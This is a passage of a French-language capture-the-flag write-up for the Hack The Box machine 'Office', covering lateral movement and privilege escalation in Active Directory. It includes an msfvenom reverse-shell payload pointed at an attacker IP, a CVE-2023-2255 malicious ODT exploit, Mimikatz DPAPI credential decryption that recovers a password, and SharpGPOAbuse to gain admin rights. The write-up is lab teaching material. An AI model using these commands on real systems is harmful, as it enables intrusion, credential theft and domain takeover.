+<pre tabindex="0"><code>sudo neo4j start
+
+bloodhound --no-sandbox
+</code></pre><p>Lorsque Bloodhound est lancé, nous utilisons le bouton &ldquo;Upload Data&rdquo; (télécharger les données) à droite.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Office/upload-data-bloodhound.png" alt="Upload data in Bloodhound"></p>
+<p>Sélectionnez ensuite tous les fichiers json créés par Bloodhound et les informations seront importées.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Office/bloodhound-files.png" alt="Bloodhound json files"></p>
+<p>Nous découvrons que l&rsquo;utilisateur <code>Hogan</code> a la permission <code>CanPSRemote</code> lui permettant d&rsquo;initier des sessions distantes sur la cible. Dans notre cas, <code>evil-winrm</code> peut être utilisé pour cette tâche.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Office/hhogan-canpsremote.png" alt="hhogan CanPSRemote"></p>
+<p>De plus, cet utilisateur est également membre du groupe <code>GPO Managers</code>, ce qui indique qu&rsquo;il a le droit de gérer des objets de stratégie de groupe (GPO).</p>
+<p><img src="https://scorpiosec.com/images/HTB-Office/gpo-managers-membership.png" alt="hhogan is a member of the GPO Managers group"></p>
+<p>En exécutant <code>netstat</code> dans notre shell meterpreter, nous remarquons que <code>http</code> tourne sur le port <code>8083</code>, que nous n&rsquo;avons pas découvert avec nmap.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Office/netstat-cmd.png" alt="netstat command"></p>
+<p>Pour y accéder, nous utiliserons <a href="https://github.com/nicocha30/ligolo-ng" target="_blank" >ligolo-ng</a>
+
+.</p>
+<p>En allant sur <code>http://240.0.0.1:8083/</code>, nous trouvons un site web pour Holography Industries.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Office/business-website.png" alt="Internal business website"></p>
+<p>Cliquer sur <code>Submit Application</code> nous amène à <code>/resume.php</code>, une page où nous pouvons télécharger un CV pour une demande d&rsquo;emploi.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Office/resume-php.png" alt="resume.php page for file submission"></p>
+<p>La tentative de téléchargement d&rsquo;un fichier pdf échoue, et nous apprenons que cette application n&rsquo;accepte que les fichiers <code>Doc</code>, <code>Docx</code>, <code>Docm</code>, et <code>Odt</code>.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Office/files-extensions.png" alt="file extensions acepted"></p>
+<p>Les fichiers de cette application se trouvent dans <code>C:\xampp\htdocs\internal</code>.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Office/internal-files.png" alt="Internal files"></p>
+<h3 id="deuxième-mouvement-latéral">Deuxième Mouvement Latéral</h3>
+<p>Le fichier <code>resume.php</code> appartient à l&rsquo;utilisateur <code>PPotts</code>.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Office/resume-php-permissions.png" alt="resume.php file permissions"></p>
+<p>Nous constatons également que la version 5.2 de Libre Office est installée sur la cible.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Office/Libre-Office-version.png" alt="Libre Office version"></p>
+<p>Cette version est obsolète et vulnérable au <a href="https://www.libreoffice.org/about-us/security/advisories/cve-2023-2255/" target="_blank" >CVE-2023-2255</a>
+
+ avec un PoC disponible <a href="https://github.com/elweth-sec/CVE-2023-2255" target="_blank" >ici</a>
+
+.</p>
+<p>Nous commençons par créer un fichier exe malveillant.</p>
+<pre tabindex="0"><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.15.4 LPORT=5555 -f exe -o shell.exe
+</code></pre><p>Nous créons ensuite un fichier odt malveillant.</p>
+<pre tabindex="0"><code>python3 CVE-2023-2255.py --cmd &#39;C:\Users\Public\shell.exe&#39; --output &#39;exploit.odt&#39;
+</code></pre><p><img src="https://scorpiosec.com/images/HTB-Office/malicious-odt.png" alt="Malicious odt file"></p>
+<p>Quelques minutes après avoir placé <code>shell.exe</code> dans le répertoire de notre choix et téléchargé notre fichier <code>exploit.odt</code> via l&rsquo;application interne, nous obtenons un nouveau shell meterpreter sous le nom de <code>ppotts</code>.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Office/ppotts-shell.png" alt="ppotts meterpreter shell"></p>
+<h3 id="troisième-mouvement-latéral">Troisième Mouvement Latéral</h3>
+<p>Nous utilisons <code>winpeas</code> pour énumérer le système cible et nous trouvons quelques fichiers d&rsquo;identification DPAPI.</p>
+<blockquote>
+<p>DPAPI, qui signifie Data Protection API, est un ensemble de services cryptographiques intégrés au système d&rsquo;exploitation Windows. Elle offre aux développeurs un moyen simple de protéger les données sensibles, telles que les mots de passe, les clés de chiffrement et d&rsquo;autres informations confidentielles, en chiffrant et en déchiffrant les données à l&rsquo;aide d&rsquo;algorithmes cryptographiques robustes.</p>
+</blockquote>
+<p><img src="https://scorpiosec.com/images/HTB-Office/DPAPI-Master-Keys.png" alt="DPAPI master keys"></p>
+<p><img src="https://scorpiosec.com/images/HTB-Office/DPAPI-Credential-Files.png" alt="DPAPI credential files"></p>
+<p>Avec <code>cmdkey /list</code>, nous constatons que les informations d&rsquo;identification de l&rsquo;utilisateur <code>hhogan</code> sont actuellement stockées sur la cible.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Office/cmdkey-cmd.png" alt="cmdkey command"></p>
+<p>Nous trouvons les fichiers d&rsquo;identification à l&rsquo;adresse spécifiée.</p>
+<pre tabindex="0"><code>Get-ChildItem -Hidden C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials\
+</code></pre><p><img src="https://scorpiosec.com/images/HTB-Office/Credential-files.png" alt="Credential files location"></p>
+<p>Nous localisons également les clés principales.</p>
+<pre tabindex="0"><code>Get-ChildItem -Hidden C:\Users\PPotts\AppData\Roaming\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107\
+</code></pre><p><img src="https://scorpiosec.com/images/HTB-Office/Master-key-files.png" alt="Credential files location"></p>
+<blockquote>
+<p>Les fichiers d&rsquo;identification DPAPI (Data Protection API) sont utilisés par Windows pour stocker en toute sécurité des informations sensibles, telles que les identifiants des utilisateurs, les mots de passe et d&rsquo;autres secrets. DPAPI fournit des services de cryptage que les applications peuvent utiliser pour protéger les données, en veillant à ce qu&rsquo;elles ne puissent être décryptées que par le même utilisateur que celui qui les a cryptées ou par un utilisateur disposant des clés correctes.</p>
+</blockquote>
+<p>Nous pouvons utiliser Mimikatz pour extraire les mots de passe des fichiers d&rsquo;identification. Pour déchiffrer un fichier d&rsquo;identification, nous devons d&rsquo;abord identifier la clé principale utilisée pour le chiffrer. Ensuite, nous devons décrypter la clé principale, puis utiliser cette clé principale décryptée pour décrypter le fichier d&rsquo;identification.</p>
+<p>Grâce à winpeas, nous savons que seules deux des trois clés principales sont utilisées pour les fichiers d&rsquo;identification, celles qui se terminent par <code>47eb</code> et <code>fc7d</code>.</p>
+<hr>
+<h3 id="note">Note</h3>
+<p>Supposons que nous ne sachions pas quelle clé principale a été utilisée pour crypter/décrypter un fichier d&rsquo;identification. Nous pouvons utiliser Mimikatz pour trouver la bonne clé.</p>
+<pre tabindex="0"><code>dpapi::cred /in:C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials\84F1CAEEBF466550F4967858F9353FB4
+</code></pre><p><img src="https://scorpiosec.com/images/HTB-Office/master-key-used.png" alt="Mimikatz command to identify the correct master key used"></p>
+<hr>
+<p>Nous commençons par décrypter la clé utilisée par deux fichiers (celle se terminant par <code>47eb</code>).</p>
+<pre tabindex="0"><code>dpapi::masterkey /in:&#34;C:\Users\PPotts\AppData\Roaming\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107\191d3f9d-7959-4b4d-a520-a444853c47eb&#34; /rpc
+</code></pre><p><img src="https://scorpiosec.com/images/HTB-Office/decrypted-master-key.png" alt="Mimikatz command to decrypt master key"></p>
+<p>Avec la clé principale décryptée, nous décryptons le fichier d&rsquo;identification et récupérons le mot de passe <code>H4ppyFtW183#</code>.</p>
+<pre tabindex="0"><code>dpapi::cred /in:&#34;C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials\84F1CAEEBF466550F4967858F9353FB4&#34; /masterkey:87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166
+</code></pre><p><img src="https://scorpiosec.com/images/HTB-Office/HHogan-password.png" alt="hhogan password recovered"></p>
+<p>Nous nous connectons via evil-winrm sous le nom de <code>hhogan</code>.</p>
+<pre tabindex="0"><code>evil-winrm -u &#34;HHogan&#34; -p &#34;H4ppyFtW183#&#34; -i dc.office.htb
+</code></pre><p><img src="https://scorpiosec.com/images/HTB-Office/HHogan-shell.png" alt="hhogan shell via evil-winrm"></p>
+<h2 id="elévation-de-privilèges">Elévation de Privilèges</h2>
+<p>Nous utilisons <code>Get-GPO -All</code> pour lister toutes les GPOs du domaine. Deux d&rsquo;entre elles attirent notre attention mais nous devons vérifier si cet utilisateur a les permissions d&rsquo;interagir avec elles. Nous notons également leurs IDs.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Office/Default-Domain-Policy.png" alt="Default domain policy"></p>
+<p><img src="https://scorpiosec.com/images/HTB-Office/Default-DC-policy.png" alt="Default DC domain policy"></p>
+<p>Avec <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1" target="_blank" >PowerView</a>
+
+ nous énumérons les permissions GPO. Après avoir téléchargé le script, nous devons importer le module pour être en mesure de l&rsquo;utiliser.</p>
+<pre tabindex="0"><code>Import-Module ./powerview.ps1
+Get-NetGroup -name &#34;GPO Managers&#34;
+</code></pre><p><img src="https://scorpiosec.com/images/HTB-Office/Powerview-GPO-Managers.png" alt="PowerView used to enumerate the GPO Managers group"></p>
+<p>Le groupe <code>GPO Managers</code> a un SID de <code>S-1-5-21-1199398058-4196589450-691661856-1117</code>.</p>
+<p>Nous ciblons spécifiquement la stratégie <code>Default Domain Controllers Policy</code> et énumérons ses permissions à l&rsquo;aide de PowerView.</p>
+<pre tabindex="0"><code>Get-NetGPO | Where-Object { $_.DisplayName -eq &#34;Default Domain Controllers Policy&#34; } | ForEach-Object { Get-ObjectAcl -ResolveGUIDs -Name $_.Name }
+</code></pre><p><img src="https://scorpiosec.com/images/HTB-Office/GPO-Permissions.png" alt="Default Domain Controller Policy permissions"></p>
+<p>Nous remarquons que le SID listé correspond au SID du groupe GPO Managers. De plus, <code>AceType</code> et <code>AceQualifier</code> sont tous deux configurés avec <code>AccessAllowed</code>. Ces informations confirment que les membres du groupe <code>GPO Managers</code> peuvent exercer toutes les permissions qu&rsquo;ils ont sur <code>Default Domain Controllers Policy</code>.</p>
+<p>Nous exploitons cette mauvaise configuration et ajoutons <code>hhogan</code> au groupe des administrateurs avec un outil appelé <a href="https://github.com/byronkg/SharpGPOAbuse/releases/tag/1.0" target="_blank" >SharpGPOAbuse</a>
+
+.</p>
+<pre tabindex="0"><code>.\sharpgpoabuse.exe --AddLocalAdmin --UserAccount HHogan --GPOName &#34;Default Domain Controllers Policy&#34;
+</code></pre><p><img src="https://scorpiosec.com/images/HTB-Office/sharpgpoabuse-cmd.png" alt="SharpGPOAbuse command"></p>
+<p>Nous mettons à jour la politique pour que la tâche prenne effet.</p>
+<pre tabindex="0"><code>gpupdate /force
+</code></pre><p><img src="https://scorpiosec.com/images/HTB-Office/gpupdate.png" alt="gpudate command"></p>
+<p>L&rsquo;utilisateur <code>hhogan</code> est maintenant membre du groupe <code>Administrators</code>.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Office/administrators-add.png" alt="user added to the Administrators group"></p>
+<p>Il suffit de se déconnecter et de se reconnecter pour accéder au bureau de l&rsquo;administrateur et lire <code>root.txt</code>.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Office/root-flag.png" alt="Root flag location"></p>
+<h2 id="mots-de-fin">Mots de Fin</h2>
+<p>Merci d&rsquo;avoir lu mon article, si vous voulez en savoir plus sur Active Directory (ce que je vous recommande vivement), vous trouverez ci-dessous quelques ressources utiles:</p>
+<ul>
+<li>TryHackMe vous donne accès à deux réseaux AD gratuitement à condition que vous ayez un streak de 7 jours minimum, trouvez-les <a href="https://tryhackme.com/r/hacktivities" target="_blank" >ici</a>
+
+ dans la section <code>Networks</code>.</li>
+<li>Ils proposent également des rooms gratuites consacrées à Active Directory, telles que <a href="https://tryhackme.com/r/room/winadbasics" target="_blank" >Active Directory Basics</a>
+
+, <a href="https://tryhackme.com/r/room/attacktivedirectory" target="_blank" >Attacktive Directory</a>
+
+, <a href="https://tryhackme.com/r/room/ra" target="_blank" >Ra</a>
+
+, <a href="https://tryhackme.com/r/room/resetui" target="_blank" >Reset</a>
+
+ et <a href="https://tryhackme.com/r/room/enterprise" target="_blank" >Enterprise</a>
+
+.</li>
+<li>HackTheBox Academy propose plusieurs modules sur Active Directory, visitez <a href="https://academy.hackthebox.com/modules" target="_blank" >cette</a>
+
+ et cherchez &ldquo;active directory&rdquo; pour les trouver.</li>
+<li>Si vous aimez les livres, je vous recommande particulièrement <a href="https://www.amazon.com/Pentesting-Active-Directory-Windows-based-Infrastructure/dp/1804611360" target="_blank" >Pentesting Active Directory and Windows-based Infrastructure</a>
+
+.</li>
+</ul>
+
+      </div>
+    </article>
+
+    <hr />
+
+    <div class="post-info">
+      
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+
+        <span class="tag"><a href="https://scorpiosec.com/fr/tags/hack-the-box/">Hack The Box</a></span>
+        
+    </p>
+
+      
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>
+
+        <span class="tag"><a href="https://scorpiosec.com/fr/categories/writeups/">Writeups</a></span>
+        
+    </p>
+
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
+          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+          <polyline points="14 2 14 8 20 8"></polyline>
+          <line x1="16" y1="13" x2="8" y2="13"></line>
+          <line x1="16" y1="17" x2="8" y2="17"></line>
+          <polyline points="10 9 9 9 8 9"></polyline>
+        </svg>
+        2472 Mots
+      </p>
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
+          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+          <line x1="16" y1="2" x2="16" y2="6"></line>
+          <line x1="8" y1="2" x2="8" y2="6"></line>
+          <line x1="3" y1="10" x2="21" y2="10"></line>
+        </svg>
+        
+          2024-06-19 23:28
+        
+
+         
+          
+        
+      </p>
+    </div>
+      <hr />
+      <div class="sharing-buttons">
+        
+<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f06%2fhtb-office%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook">
+  <div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f06%2fhtb-office%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter">
+  <div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small">
+      <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+        <svg role="img" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+    <title>X</title>
+    <path d="M18.901 1.153h3.68l-8.04 9.19L24 22.846h-7.406l-5.8-7.584-6.638 7.584H.474l8.6-9.83L0 1.154h7.594l5.243 6.932ZM17.61 20.644h2.039L6.486 3.24H4.298Z" stroke="#ffffff"/>
+</svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=HTB%3a%20Office&amp;caption=HTB%3a%20Office&amp;canonicalUrl=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f06%2fhtb-office%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr">
+  <div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small">
+    <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093 0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 4.71-6.469C9.84.051 9.941 0 9.999 0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="mailto:?subject=HTB%3a%20Office&amp;body=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f06%2fhtb-office%2f" target="_self" rel="noopener" aria-label="" title="Share via email">
+  <div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f06%2fhtb-office%2f&amp;media=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f06%2fhtb-office%2f;description=HTB%3a%20Office" target="_blank" rel="noopener" aria-label="" title="Share on pinterest">
+  <div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024 0 1.518.769 1.518 1.688 0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128 0 3.768-2.245 3.768-5.487 0-2.861-2.063-4.869-5.008-4.869-3.41 0-5.409 2.562-5.409 5.199 0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646 0-3.776 2.748-7.252 7.92-7.252 4.158 0 7.392 2.967 7.392 6.923 0 4.135-2.607 7.462-6.233 7.462-1.214 0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607 0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017 0z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f06%2fhtb-office%2f&amp;title=HTB%3a%20Office&amp;summary=HTB%3a%20Office&amp;source=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f06%2fhtb-office%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin">
+  <div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f06%2fhtb-office%2f&amp;resubmit=true&amp;title=HTB%3a%20Office" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
+  <div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 0 1-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968 0 1.754.786 1.754 1.754 0 .716-.435 1.333-1.01 1.614a3.111 3.111 0 0 1 .042.52c0 2.694-3.13 4.87-7.004 4.87-3.874 0-7.004-2.176-7.004-4.87 0-.183.015-.366.043-.534A1.748 1.748 0 0 1 4.028 12c0-.968.786-1.754 1.754-1.754.463 0 .898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342 0 0 1 .14-.197.35.35 0 0 1 .238-.042l2.906.617a1.214 1.214 0 0 1 1.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687 0 1.248-.561 1.248-1.249 0-.688-.561-1.249-1.249-1.249zm5.5 0c-.687 0-1.248.561-1.248 1.25 0 .687.561 1.248 1.249 1.248.688 0 1.249-.561 1.249-1.249 0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327 0 0 0-.231.094.33.33 0 0 0 0 .463c.842.842 2.484.913 2.961.913.477 0 2.105-.056 2.961-.913a.361.361 0 0 0 .029-.463.33.33 0 0 0-.464 0c-.547.533-1.684.73-2.512.73-.828 0-1.979-.196-2.512-.73a.326.326 0 0 0-.232-.095z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f06%2fhtb-office%2f;title=HTB%3a%20Office" target="_blank" rel="noopener" aria-label="" title="Share on xing">
+  <div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M18.188 0c-.517 0-.741.325-.927.66 0 0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211 0 .375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016 0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894 0 21.686 0h-3.498zM3.648 4.74c-.211 0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016 0 .021L1.86 16.051c-.099.188-.093.381 0 .529.085.142.239.234.45.234h3.461c.518 0 .766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="whatsapp://send?text=HTB%3a%20Office%20https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f06%2fhtb-office%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp">
+  <div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f06%2fhtb-office%2f&amp;t=HTB%3a%20Office" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
+  <div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+			<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=HTB%3a%20Office&amp;url=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f06%2fhtb-office%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram">
+  <div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
+    </div>
+  </div>
+</a>
+
+      </div>
+
+    
+    <div class="pagination">
+        
+
+        <div class="pagination__buttons">
+            
+            <span class="button previous">
+                <a href="https://scorpiosec.com/fr/posts/2024/07/htb-perfection/">
+                    <span class="button__icon">←</span>
+                    <span class="button__text">HTB: Perfection</span>
+                </a>
+            </span>
+            
+
+            
+            <span class="button next">
+                <a href="https://scorpiosec.com/fr/posts/2024/06/thm-cyberlens/">
+                    <span class="button__text">THM: CyberLens</span>
+                    <span class="button__icon">→</span>
+                </a>
+            </span>
+            
+        </div>
+    </div>
+
+
+    
+
+    
+
+    
+    <script src="https://utteranc.es/client.js"
+            repo="K-Scorpio/scorpiosec"
+            label="comment"
+            issue-term="pathname"
+            theme="github-dark"
+            crossorigin="anonymous"
+            async>
+    </script>
+    
+
+  </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2023</span>
+            
+            
+            
+            <span>K-Scorpio</span>
+        </div>
+    </div>
+    
+    
+    <div class="footer__inner">
+        <div class="footer__content">
